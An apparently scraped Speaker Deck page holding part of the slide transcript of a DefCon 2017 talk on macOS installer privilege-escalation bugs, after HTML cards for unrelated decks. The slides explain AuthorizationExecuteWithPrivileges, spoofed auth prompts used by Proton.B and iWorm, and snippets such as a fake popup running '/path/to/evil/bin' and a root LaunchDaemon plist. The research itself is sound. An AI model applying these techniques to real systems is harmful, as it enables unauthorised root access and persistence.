+              <span title="276,747 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 280k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/gr2m/rails-girls-zurich-keynote" title="Rails Girls Zürich Keynote">
+      <div class="card deck-preview" data-id="5094ed43cac044000201e84a" data-slide-count="23" data-cover-image="https://files.speakerdeck.com/presentations/5094ed43cac044000201e84a/preview_slide_0.jpg?26220">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/5094ed43cac044000201e84a/preview_slide_0.jpg?26220');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/5094ed43cac044000201e84a/preview_slide_0.jpg?26220');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/24fc194843a71f10949be18d5a692682?s=48" alt="24fc194843a71f10949be18d5a692682?s=48" />
+              gr2m
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 85
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="11,180 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 11k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/roundedbygravity/support-driven-design" title="Support Driven Design">
+      <div class="card deck-preview" data-id="4fa0cdca5f48f7002205098e" data-slide-count="78" data-cover-image="https://files.speakerdeck.com/presentations/4fa0cdca5f48f7002205098e/preview_slide_0.jpg?356403">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/4fa0cdca5f48f7002205098e/preview_slide_0.jpg?356403');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/4fa0cdca5f48f7002205098e/preview_slide_0.jpg?356403');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/1519587b1a0febb658c36c94f6272b0d?s=48" alt="1519587b1a0febb658c36c94f6272b0d?s=48" />
+              roundedbygravity
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 84
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="7,945 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 7.9k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/cromwellryan/making-the-leap-to-tech-lead" title="Making the Leap to Tech Lead">
+      <div class="card deck-preview" data-id="f35d80cef9ab4089afa5fe0803215140" data-slide-count="30" data-cover-image="https://files.speakerdeck.com/presentations/f35d80cef9ab4089afa5fe0803215140/preview_slide_0.jpg?13936250">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/f35d80cef9ab4089afa5fe0803215140/preview_slide_0.jpg?13936250');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/f35d80cef9ab4089afa5fe0803215140/preview_slide_0.jpg?13936250');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/32de0bd2ba869609d26fd052a4622778?s=48" alt="32de0bd2ba869609d26fd052a4622778?s=48" />
+              cromwellryan
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 104
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="6,324 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 6.3k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/rasmusluckow/agile-that-works-and-the-tools-we-love" title="Agile that works and the tools we love">
+      <div class="card deck-preview" data-id="508bed81c21140000202a6db" data-slide-count="69" data-cover-image="https://files.speakerdeck.com/presentations/508bed81c21140000202a6db/preview_slide_0.jpg?743617">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/508bed81c21140000202a6db/preview_slide_0.jpg?743617');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/508bed81c21140000202a6db/preview_slide_0.jpg?743617');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/462dad0dd24c568a32dcdb0ae895ae1b?s=48" alt="462dad0dd24c568a32dcdb0ae895ae1b?s=48" />
+              rasmusluckow
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 318
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="18,543 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 19k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/tmm1/debugging-ruby-performance" title="Debugging Ruby Performance">
+      <div class="card deck-preview" data-id="4dd3e5315753080234000001" data-slide-count="110" data-cover-image="https://files.speakerdeck.com/presentations/4dd3e5315753080234000001/preview_slide_0.jpg?525998">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/4dd3e5315753080234000001/preview_slide_0.jpg?525998');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/4dd3e5315753080234000001/preview_slide_0.jpg?525998');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/d47656e20ff5e42f125fc5ea0fd636c6?s=48" alt="D47656e20ff5e42f125fc5ea0fd636c6?s=48" />
+              tmm1
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 62
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="9,927 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 9.9k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/smashingmag/the-invisible-side-of-design" title="The Invisible Side of Design">
+      <div class="card deck-preview" data-id="4e94aa54fcba560051000c3c" data-slide-count="126" data-cover-image="https://files.speakerdeck.com/presentations/4e94aa54fcba560051000c3c/preview_slide_0.jpg?583358">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/4e94aa54fcba560051000c3c/preview_slide_0.jpg?583358');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/4e94aa54fcba560051000c3c/preview_slide_0.jpg?583358');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/b3d6434763caa0ef5dc4b792662c49f7?s=48" alt="B3d6434763caa0ef5dc4b792662c49f7?s=48" />
+              smashingmag
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 283
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="46,805 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 47k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/jlugia/build-your-cross-platform-service-in-a-week-with-app-engine" title="Build your cross-platform service in a week with App Engine">
+      <div class="card deck-preview" data-id="03ad1120aa2501313da22a463594f846" data-slide-count="27" data-cover-image="https://files.speakerdeck.com/presentations/03ad1120aa2501313da22a463594f846/preview_slide_0.jpg?4187143">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/03ad1120aa2501313da22a463594f846/preview_slide_0.jpg?4187143');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/03ad1120aa2501313da22a463594f846/preview_slide_0.jpg?4187143');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/5f83ef806155b403c3393160ce51f955?s=48" alt="5f83ef806155b403c3393160ce51f955?s=48" />
+              jlugia
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 217
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="16,158 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 16k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+            <div class="col-12 col-md-6 col-lg-4 mb-5">
+    <a href="/tanoku/ruby-is-unlike-a-banana" title="Ruby is Unlike a Banana">
+      <div class="card deck-preview" data-id="4fc8aa4002ee4b002200a98d" data-slide-count="32" data-cover-image="https://files.speakerdeck.com/presentations/4fc8aa4002ee4b002200a98d/preview_slide_0.jpg?405512">
+        <div class="deck-preview-image">
+          <div class="content"></div>
+          <div class="deck-preview-slide" style="background-image: url('https://files.speakerdeck.com/presentations/4fc8aa4002ee4b002200a98d/preview_slide_0.jpg?405512');"></div>
+          <div class="deck-preview-background" style="background-image: url('https://files.speakerdeck.com/presentations/4fc8aa4002ee4b002200a98d/preview_slide_0.jpg?405512');"></div>
+          <div class="deck-preview-slide deck-preview-scrub-slide"></div>
+          <div class="deck-preview-background deck-preview-scrub-background"></div>
+          <div class="deck-preview-scrubber"></div>
+        </div>
+        <div class="deck-preview-meta d-flex px-2">
+            <div class="text-truncate py-3 px-2">
+              <img class="avatar avatar-sm" src="//secure.gravatar.com/avatar/6804f1775cb4babfcc3851298566fbce?s=48" alt="6804f1775cb4babfcc3851298566fbce?s=48" />
+              tanoku
+            </div>
+            <div class="px-2 mr-auto py-3">
+              <svg class="icon icon-star "><use xlink:href="/icons/icons.svg#icon-star"></use></svg> 86
+            </div>
+            <div class="px-2 ml-auto py-3">
+              <span title="8,691 views"><svg class="icon icon-eye "><use xlink:href="/icons/icons.svg#icon-eye"></use></svg> 8.7k</span>
+            </div>
+        </div>
+      </div>
+    </a>
+  </div>
+
+      </div>
+  </div>
+</div>
+
+  <div class="container py-4 transcript">
+    <h2 class="mb-4">Transcript</h2>
+    <ol>
+        <li class="mb-2">
+            <h3>
+              <a alt="@patrickwardle
+DEATH BY 1000 INSTALLERS
+...it&#39;s..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! @patrickwardle
+DEATH BY 1000 INSTALLERS
+...it&amp;#39;s..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_0.jpg">@patrickwardle DEATH BY 1000 INSTALLERS ...it&#39;s all broken :(</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="WHOIS
+“leverages the best combination of humans..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! WHOIS
+“leverages the best combination of humans..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_1.jpg">WHOIS “leverages the best combination of humans and technology to</a>
+            </h3>
+            discover security vulnerabilities in our customers’ web apps, mobile apps, IoT devices and infrastructure endpoints” security for the 21st century @patrickwardle
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="issues; bugs; &amp; exploits!
+OUTLINE
+authorization..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! issues; bugs; &amp;amp; exploits!
+OUTLINE
+authorization..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_2.jpg">issues; bugs; &amp; exploits! OUTLINE authorization core issues finding 0days</a>
+            </h3>
+            bugs exploits
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="(user-assisted) privilege escalation
+THE GOAL
+i..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! (user-assisted) privilege escalation
+THE GOAL
+i..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_3.jpg">(user-assisted) privilege escalation THE GOAL infect trojan email exploits }</a>
+            </h3>
+            1 2 escalate privileges $_ #_ fake popups (lame) vulnerabilities today, we&#39;ll focus on finding &amp; exploiting vulnerabilities in installers/updaters that (with user assistance) provide the means for local elevation of privileges. } (not lame) today&#39;s talk
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="AUTHORIZATION
+executing priv&#39;d actions (ui)
+" title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! AUTHORIZATION
+executing priv&amp;#39;d actions (ui)
+" href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_4.jpg">AUTHORIZATION executing priv&#39;d actions (ui)</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="(low-priv&#39;d) apps may need to perform priv&#39;d ac..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! (low-priv&amp;#39;d) apps may need to perform priv&amp;#39;d ac..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_5.jpg">(low-priv&#39;d) apps may need to perform priv&#39;d actions THE NEED</a>
+            </h3>
+            installing updating debugging system conf }most common ...for me, about 1x a day!
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="authentication &amp; authorization
+BEHIND THE SCENE..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! authentication &amp;amp; authorization
+BEHIND THE SCENE..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_6.jpg">authentication &amp; authorization BEHIND THE SCENES security agent: show authentication</a>
+            </h3>
+            dialog installer: &quot;I wanna do a priv&#39;d action&quot; 1 2 3 4 authorization daemon: authorization database XPC XPC priv&#39;d action! more info: &quot;Authorization Services Programming Guide&quot; -apple &quot;*OS Internals v.III&quot; -levin consult auth db xpc for auth prompt
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="request via AuthorizationExecuteWithPrivileges(..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! request via AuthorizationExecuteWithPrivileges(..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_7.jpg">request via AuthorizationExecuteWithPrivileges() BEHIND THE SCENES installer: &quot;I wanna do</a>
+            </h3>
+            a priv&#39;d action&quot; 1 AuthorizationRef authRef; AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &amp;authRef); AuthorizationExecuteWithPrivileges(authRef, &quot;/path/to/binary&quot;, kAuthorizationFlagDefaults, NULL, NULL); AuthorizationExecuteWithPrivileges() define TRAMPOLINE &quot;/usr/libexec/ security_authtrampoline&quot; AuthorizationExecuteWithPrivileges() -&gt; AuthorizationExecuteWithPrivilegesExternalForm() switch (fork()) { //child case 0: execv(trampoline, (char *const*)argv); $ ls -lart /usr/libexec/security_authtrampoline -rws--x--x root wheel security_authtrampoline int main() { AuthorizationItem right = {EXECUTERIGHT, ...}; AuthorizationRights inRights = { 1, &amp;right }; AuthorizationCopyRights(auth, &amp;inRights, NULL, kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed, &amp;outRights)) execv(pathToTool, (char *const *)restOfArguments); XPC # ps aux | grep authd 112 /System/Library/Frameworks/Security.framework/ Versions/A/XPCServices/authd.xpc/Contents/MacOS/authd # lsmp -p 112 | grep security_authtrampoline ... send-once --&gt; (1243) security_authtrampoline # lsmp -p 1243 | grep authd send-once &lt;-- (112) authd security_authtrampoline security_authtrampoline; setuid
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="authd; servicing authorization requests
+BEHIND ..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! authd; servicing authorization requests
+BEHIND ..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_8.jpg">authd; servicing authorization requests BEHIND THE SCENES authd: &quot;responsible for</a>
+            </h3>
+            servicing authorization requests made by client&quot; -*OS Internals, j levin (p. 92) 2 authorization database # sqlite3 /var/db/auth.db .dump | grep system.privilege.admin INSERT INTO &quot;rules&quot; VALUES(135,&#39;system.privilege.admin&#39;,1,1,&#39;admin&#39;,...  &#39;Used by AuthorizationExecuteWithPrivileges(...). XPC XPC //&#39;system.privilege.admin&#39; AuthorizationItem right = {EXECUTERIGHT, ...}; AuthorizationCopyRights(...); authorization daemon: consult auth db xpc for auth prompt
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="Security Agent; give me creds!
+BEHIND THE SCENE..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! Security Agent; give me creds!
+BEHIND THE SCENE..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_9.jpg">Security Agent; give me creds! BEHIND THE SCENES $ lsappinfo</a>
+            </h3>
+            processlist ASN:0x0-0x1001-&quot;loginwindow&quot;:   ASN:0x0-0xb00b-&quot;SystemUIServer&quot;: ASN:0x0-0xc00c-&quot;Dock&quot;: ... ASN:0x0-0x43043-&quot;SecurityAgent&quot;: # lsmp -p 112 | grep SecurityAgent + send &lt;- (1532) SecurityAgent send -&gt; (1532) SecurityAgent send -&gt; (1532) SecurityAgent + send-once &lt;- (1532) SecurityAgent SecurityAgent: &quot;an XPC service responsible for the UI&quot;   -j levin XPC messages from authd to SecurityAgent int main() { AuthorizationItem right = {EXECUTERIGHT, ...}; AuthorizationRights inRights = { 1, &amp;right }; AuthorizationCopyRights(auth, &amp;inRights, NULL, kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed, &amp;outRights)) execv(pathToTool, (char *const *)restOfArguments); security_authtrampoline XPC authentication dialog password &#39;out of proc&#39; #_
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="CORE ISSUES
+what&#39;s the problem(s)?
+" title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! CORE ISSUES
+what&amp;#39;s the problem(s)?
+" href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_10.jpg">CORE ISSUES what&#39;s the problem(s)?</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="trust no one!
+AM I LEGIT?
+vs.
+spoofed?
+system g..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! trust no one!
+AM I LEGIT?
+vs.
+spoofed?
+system g..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_11.jpg">trust no one! AM I LEGIT? vs. spoofed? system generated,</a>
+            </h3>
+            albeit malicious? is the popup on the right: ...and wtf is Slack doing anyways!? legitimate (promise!) note: these not bugs/vulnerabilities
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="osx/proton.b
+SPOOFING
+&quot;OSX/Proton.B; a brief an..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! osx/proton.b
+SPOOFING
+&amp;quot;OSX/Proton.B; a brief an..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_12.jpg">osx/proton.b SPOOFING &quot;OSX/Proton.B; a brief analysis, at 6 miles up&quot;</a>
+            </h3>
+            -objective-see.com/blog.html (lldb) po $rax &lt;AuthorizationWindow: 0x10017f9f0&gt; (lldb) po [$rax password] &lt;NSSecureTextField: 0x10010bdb0&gt; (lldb) po [[$rax password] stringValue] hunter2 100% fake handbrake.fr osx/proton.b &#39;auth&#39; window code thanks for the password :/
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="...but malicious
+&#39;LEGITIMATE&#39;
+-(void)applicatio..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! ...but malicious
+&amp;#39;LEGITIMATE&amp;#39;
+-(void)applicatio..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_13.jpg">...but malicious &#39;LEGITIMATE&#39; -(void)applicationDidFinishLaunching:(NSNotification *)aNotification { //create auth ref AuthorizationRef</a>
+            </h3>
+            authRef;  AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &amp;authRef); //exec with privs // -&gt;will generated system auth popup AuthorizationExecuteWithPrivileges(authRef, &quot;/path/to/evil/bin&quot;, kAuthorizationFlagDefaults, NULL, NULL);  } slack&#39;s (real) icons creating a &#39;legit&#39; auth popup #_ &#39;legit&#39; auth popup copy into code
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="example; iWorm
+&#39;LEGITIMATE&#39;
+# fs_usage -w -f fi..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! example; iWorm
+&amp;#39;LEGITIMATE&amp;#39;
+# fs_usage -w -f fi..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_14.jpg">example; iWorm &#39;LEGITIMATE&#39; # fs_usage -w -f filesys 20:28:28.727871 open</a>
+            </h3>
+            /Library/LaunchDaemons/com.JavaW.plist 20:28:28.727890 write B=0x16b int sub_1cf6() { *(int16_t *)(pathEnd) = &quot;0/&quot;; if (AuthorizationCreate(0x0, 0x0, 0x0, var_40C) == 0x0) { AuthorizationExecuteWithPrivileges(var_40C, path, 0x0, 0x0, 0x0); AuthorizationFree(var_40C, 0x0); } authentication prompt persistently installing osx/iworm installer&#39;s code infected apps &#39;0&#39; binary
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="...easy but dangerous (&amp; deprecated)
+AUTHORIZAT..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! ...easy but dangerous (&amp;amp; deprecated)
+AUTHORIZAT..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_15.jpg">...easy but dangerous (&amp; deprecated) AUTHORIZATIONEXECUTEWITHPRIVILEGES AuthorizationRef authRef; AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment,</a>
+            </h3>
+            kAuthorizationFlagDefaults, &amp;authRef); AuthorizationExecuteWithPrivileges(authRef, &quot;/path/to/binary&quot;, kAuthorizationFlagDefaults, NULL, NULL); #_ BetterAuthorizationSample: &quot;Shows the recommended way to access privileged functionality from a non- privileged application on Mac OS X&quot; -developer.apple.com } AuthorizationExecuteWithPrivileges local, non-priv&#39;d, modifies binary! performs no validation on what it is executing (as root)!!!
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="...often perform unsafe actions!
+AUTHORIZED (PR..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! ...often perform unsafe actions!
+AUTHORIZED (PR..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_16.jpg">...often perform unsafe actions! AUTHORIZED (PRIV&#39;D) TOOLS #_ assume this</a>
+            </h3>
+            is secure } load/execute &#39;unsecured&#39; components create insecure temp files install &#39;unsecured&#39; components but then... #_ 1 2 create:  /tmp/blah.plist write:  /tmp/blah.plist move to:  /Library/LaunchDaemons/ 3 } local, non-priv&#39;d, modifies plist! r00t!
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="FINDING 0days
+&#39;user-assisted&#39; priv-escalations
+" title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! FINDING 0days
+&amp;#39;user-assisted&amp;#39; priv-escalations
+" href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_17.jpg">FINDING 0days &#39;user-assisted&#39; priv-escalations</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="....everybody :(
+WHO CALLS AUTHORIZATIONEXECUTE..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! ....everybody :(
+WHO CALLS AUTHORIZATIONEXECUTE..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_18.jpg">....everybody :( WHO CALLS AUTHORIZATIONEXECUTEWITHPRIVILEGES OSStatus AuthorizationExecuteWithPrivilegesExternalForm(const AuthorizationExternalForm * extForm,</a>
+            </h3>
+            const char *pathToTool ...) { // report the caller to the authorities aslmsg m = asl_new(ASL_TYPE_MSG); asl_set(m, &quot;com.apple.message.domain&quot;, &quot;com.apple.libsecurity_authorization.AuthorizationExecuteWithPrivileges&quot;); asl_set(m, &quot;com.apple.message.signature&quot;, getprogname()); asl_log(NULL, m, ASL_LEVEL_NOTICE, &quot;AuthorizationExecuteWithPrivileges!&quot;); ... $ strings /private/var/log/DiagnosticMessages/* | grep -A 1 AuthorizationExecuteWithPrivileges! $AuthorizationExecuteWithPrivileges! Slack ...  VMware Fusion Google Chrome Little Snitch Installer osascript Autoupdate (Sparkle) lib/trampolineClient.cpp Console.app *.asl logs } vulnerable? q: is binary, passed to AuthorizationExecute... writable* by non-priv&#39;d code? authentication attempts are logged
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="is it writable?
+AUTHORIZATIONEXECUTEWITHPRIVILE..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! is it writable?
+AUTHORIZATIONEXECUTEWITHPRIVILE..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_19.jpg">is it writable? AUTHORIZATIONEXECUTEWITHPRIVILEGES() PAYLOAD AuthorizationExecuteWithPrivileges(authRef, &quot;/sbin/reboot&quot;, kAuthorizationFlagDefaults, NULL, NULL);</a>
+            </h3>
+            vs. AuthorizationExecuteWithPrivileges(authRef, &quot;~/Downloads/Install.app&quot;, kAuthorizationFlagDefaults, NULL, NULL); world-writable, but exec&#39;d as r00t # procmon new process: security_authtrampoline (24977) path: /usr/libexec/security_authtrampoline pid: 24977 args: &quot;~/Downloads/Install.app&quot;, ... process monitor &#39;security_authtrampoline&#39; what is it exec&#39;ing? } can non-priv&#39;d code modify it? # lldb &lt;path/to/app&gt; (lldb) b AuthorizationExecuteWithPrivileges (lldb) r ... * thread #1: Security`AuthorizationExecuteWithPrivileges  stop reason = breakpoint 1.1 (lldb) x/s $rsi 0x100000fa2: &quot;~/Downloads/Install.app&quot; debugger (lldb)
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="often &#39;unsafe&#39; things!
+WHAT DOES AUTHORIZED PRO..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! often &amp;#39;unsafe&amp;#39; things!
+WHAT DOES AUTHORIZED PRO..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_20.jpg">often &#39;unsafe&#39; things! WHAT DOES AUTHORIZED PROCESS (THEN) DO? #_</a>
+            </h3>
+            } load/execute &#39;unsecured&#39; components create insecure temp files install &#39;unsecured&#39; components # fs_usage -w -f filesystem | grep Installer stat64 /Library/LaunchDaemons/com.insecure.plist Installer access /Library/LaunchDaemons/com.insecure.plist Installer rename ~/Downloads/Install.app/Contents/Resources/com.insecure.plist Installer chown /Library/LaunchDaemons/com.blah.plist Installer file monitor Launch Daemons &lt;key&gt;RunAtLoad&lt;/key&gt; &lt;true/&gt; &lt;key&gt;ProgramArguments&lt;/key&gt; &lt;array&gt; &lt;string&gt;/Library/evil.bin&lt;/string&gt; &lt;/array&gt; plist (executed as r00t) persisted as r00t :/ plist
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="BUGS
+if(no CVE) then 0day;
+" title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! BUGS
+if(no CVE) then 0day;
